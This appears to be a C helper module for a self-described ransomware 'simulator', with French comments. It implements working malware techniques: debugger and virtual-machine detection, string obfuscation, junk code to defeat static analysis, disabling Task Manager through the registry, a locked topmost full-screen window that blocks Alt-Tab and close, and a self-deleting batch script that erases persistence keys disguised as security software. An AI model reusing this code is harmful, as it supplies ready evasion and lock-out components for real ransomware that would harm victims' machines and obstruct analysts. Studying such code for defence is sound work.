#include "main.h"

// Conversion d'une chaîne ANSI en UTF-16 (Wide)
wchar_t* AnsiToWide(const char* ansi) {
    int size_needed = MultiByteToWideChar(CP_ACP, 0, ansi, -1, NULL, 0);
    wchar_t* wstr = (wchar_t*)malloc(size_needed * sizeof(wchar_t));
    MultiByteToWideChar(CP_ACP, 0, ansi, -1, wstr, size_needed);
    return wstr;
}

// Conversion d'une chaîne UTF-16 (Wide) en ANSI
char* WideToAnsi(const wchar_t* wide) {
    int size_needed = WideCharToMultiByte(CP_ACP, 0, wide, -1, NULL, 0, NULL, NULL);
    char* str = (char*)malloc(size_needed);
    WideCharToMultiByte(CP_ACP, 0, wide, -1, str, size_needed, NULL, NULL);
    return str;
}

// Fonction anti-débogage
void AntiDebug() {
    if (IsDebuggerPresent()) {
        ExitProcess(0);
    }

    BOOL debugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
    if (debugged) {
        ExitProcess(0);
    }

    // Mesure du temps d'exécution
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    Sleep(10);

    QueryPerformanceCounter(&end);
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;

    if (elapsed > 0.1) {
        ExitProcess(0);
    }
}

// Détection de machine virtuelle
void CheckVirtualMachine() {
    SC_HANDLE scm = OpenSCManagerA(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (scm) {
        ENUM_SERVICE_STATUSA services[1000];
        DWORD bytesNeeded, servicesReturned, resumeHandle = 0;
        if (EnumServicesStatusA(scm, SERVICE_WIN32, SERVICE_ACTIVE,
                             services, sizeof(services), &bytesNeeded,
                             &servicesReturned, &resumeHandle)) {

            for (DWORD i = 0; i < servicesReturned; i++) {
                const char* name = services[i].lpServiceName;
                if (strstr(name, "vmware") || strstr(name, "vbox") ||
                    strstr(name, "virtual") || strstr(name, "qemu")) {
                    printf("VM détectée: %s\n", name);
                }
            }
        }
        CloseServiceHandle(scm);
    }

    // Vérification du registre
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
                    "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
                    0, KEY_READ, &hKey) == ERROR_SUCCESS) {

        char identifier[256] = {0};
        DWORD size = sizeof(identifier);
        if (RegQueryValueExA(hKey, "Identifier", NULL, NULL, (BYTE*)identifier, &size) == ERROR_SUCCESS) {
            if (strstr(identifier, "VBOX") || strstr(identifier, "VMware") ||
                strstr(identifier, "QEMU") || strstr(identifier, "Virtual")) {
                printf("VM détectée dans le registre: %s\n", identifier);
            }
        }
        RegCloseKey(hKey);
    }
}

// Cache la fenêtre console
void HideConsoleWindow() {
    HWND console = GetConsoleWindow();
    if (console) {
        ShowWindow(console, SW_HIDE);
    }
}

// Initialisation du mutex
void InitializeMutex() {
    g_mutex = CreateMutexA(NULL, TRUE, "Global\\RansomwareSimulatorMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        g_is_first_run = FALSE;
    }
}

// Nettoyage du mutex
void CleanupMutex() {
    if (g_mutex) {
        ReleaseMutex(g_mutex);
        CloseHandle(g_mutex);
    }
}

// Fonction d'obfuscation de chaînes
char *obfuscate_str(const char *input) {
    static char buffer[256];
    unsigned char key = 0x42 ^ (GetTickCount() % 256);
    strcpy(buffer, input);
    for (int i = 0; buffer[i]; i++) {
        buffer[i] ^= key;
        key = ((key << 1) | (key >> 7)) & 0xFF;
    }
    return buffer;
}

// Désobfuscation des chaînes
char *deobfuscate_str(const char *input) {
    static char buffer[256];
    unsigned char key = 0x42 ^ (GetTickCount() % 256);
    strcpy(buffer, input);
    for (int i = 0; buffer[i]; i++) {
        buffer[i] ^= key;
        key = ((key << 1) | (key >> 7)) & 0xFF;
    }
    return buffer;
}

// Génération d'UUID
void generate_uuid(char *uuid) {
    unsigned char random_bytes[16];
    randombytes_buf(random_bytes, sizeof(random_bytes));

    snprintf(uuid, 37, "%02x%02x%02x%02x-%02x%02x-%02x%02x-%02x%02x-%02x%02x%02x%02x%02x%02x",
             random_bytes[0], random_bytes[1], random_bytes[2], random_bytes[3],
             random_bytes[4], random_bytes[5], random_bytes[6] & 0x0F | 0x40, random_bytes[7],
             random_bytes[8] & 0x3F | 0x80, random_bytes[9], random_bytes[10], random_bytes[11],
             random_bytes[12], random_bytes[13], random_bytes[14], random_bytes[15]);

    printf("UUID généré: %s\n", uuid);
}

// Code inutile pour brouiller l'analyse statique
void InsertJunkCode() {
    int a = rand(), b = rand(), c;

    switch(rand() % 5) {
        case 0: c = a + b; break;
        case 1: c = a - b; break;
        case 2: c = a * b; break;
        case 3: c = b ? a / b : 0; break;
        case 4: c = a ^ b; break;
    }

    if ((c % 100) == 42) {
        MessageBoxA(NULL, "This will never show", "Junk", MB_OK);
    }
}

// Délai aléatoire pour compliquer l'analyse
void RandomDelay() {
    int delay = 10 + (rand() % 190);

    if (IsDebuggerPresent()) {
        delay += 2000; // Délai plus long si débogueur
    }

    Sleep(delay);
}

// Simulation de connexion Tor
void SimulateTorConnection(const char* message, char* response, size_t response_size) {
    printf("Simulation connexion Tor...\n");

    for (int i = 1; i <= 3; i++) {
        printf("Routing noeud %d...\n", i);
        Sleep(200);
    }

    char* encrypted = _strdup(message);
    size_t len = strlen(encrypted);

    for (int layer = 0; layer < 3; layer++) {
        for (size_t i = 0; i < len; i++) {
            encrypted[i] = encrypted[i] ^ (0x42 + layer);
        }
    }

    strncpy(response, "OK_TOR_RESPONSE", response_size);
    free(encrypted);
}

// Désactive le gestionnaire de tâches
void DisableTaskManager(BOOL disable) {
    HKEY hKey;
    LONG res = RegOpenKeyExA(HKEY_CURRENT_USER,
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                           0, KEY_SET_VALUE, &hKey);

    if (res == ERROR_SUCCESS) {
        DWORD value = disable ? 1 : 0;
        RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
        RegCloseKey(hKey);
    }

    if (res != ERROR_SUCCESS) {
        res = RegCreateKeyExA(HKEY_CURRENT_USER,
                            "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
                            0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
        if (res == ERROR_SUCCESS) {
            DWORD value = disable ? 1 : 0;
            RegSetValueExA(hKey, "DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(DWORD));
            RegCloseKey(hKey);
        }
    }
}

// Force l'affichage en plein écran
void ForceFullScreen(HWND hwnd) {
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);

    LONG style = GetWindowLongA(hwnd, GWL_STYLE);
    style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZE | WS_MAXIMIZE | WS_SYSMENU);
    SetWindowLongA(hwnd, GWL_STYLE, style);

    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, screenWidth, screenHeight, SWP_SHOWWINDOW);

    RegisterHotKey(hwnd, 100, MOD_ALT, VK_TAB);
    RegisterHotKey(hwnd, 101, MOD_ALT | MOD_SHIFT, VK_TAB);

    EnableMenuItem(GetSystemMenu(hwnd, FALSE), SC_CLOSE, MF_GRAYED);
}

// Auto-destruction du programme
void SelfDestruct() {
    char module_path[MAX_PATH];
    char bat_path[MAX_PATH];
    DWORD pid = GetCurrentProcessId();

    GetModuleFileNameA(NULL, module_path, MAX_PATH);

    GetTempPathA(MAX_PATH, bat_path);
    strcat(bat_path, "cleanup.bat");

    FILE* bat = fopen(bat_path, "w");
    if (bat) {
        fprintf(bat, "@echo off\n");
        fprintf(bat, ":wait\n");
        fprintf(bat, "tasklist | find \"%d\" >nul\n", pid);
        fprintf(bat, "if not errorlevel 1 (\n");
        fprintf(bat, "    timeout /t 1 /nobreak >nul\n");
        fprintf(bat, "    goto wait\n");
        fprintf(bat, ")\n");

        // Nettoyage des traces
        fprintf(bat, "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsDefender\" /f >nul 2>&1\n");
        fprintf(bat, "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"SystemHealthMonitor\" /f >nul 2>&1\n");
        fprintf(bat, "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run\" /v \"SecurityCenter\" /f >nul 2>&1\n");

        // Restaurer le gestionnaire de tâches
        fprintf(bat, "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableTaskMgr\" /f >nul 2>&1\n");

        // Auto-suppression
        fprintf(bat, "del /f /q \"%%~f0\"\n");

        fclose(bat);

        STARTUPINFOA si = {0};
        PROCESS_INFORMATION pi = {0};
        si.cb = sizeof(si);
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        CreateProcessA(NULL, bat_path, NULL, NULL, FALSE,
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

// Création de fichiers de test
void CreateTestFiles(const char *dir) {
    char path[MAX_PATH];

    const char* file_types[] = {
        ".txt", ".doc", ".pdf", ".jpg", ".png", ".xlsx", ".pptx", ".mp3", ".mp4", ".zip"
    };

    for (int i = 1; i <= 10; i++) {
        snprintf(path, MAX_PATH, "%s\\test_file_%d%s", dir, i, file_types[i-1]);
        FILE *f = fopen(path, "w");
        if (f) {
            fprintf(f, "Ceci est un fichier de test %d avec du contenu.\n", i);
            fprintf(f, "Ce fichier sera chiffré par le simulateur de ransomware.\n");
            fprintf(f, "Données aléatoires: %d %d %d\n", rand(), rand(), rand());
            fclose(f);
            printf("Fichier test créé: %s\n", path);
        } else {
            printf("Erreur: Échec création fichier test %s\n", path);
        }
    }
}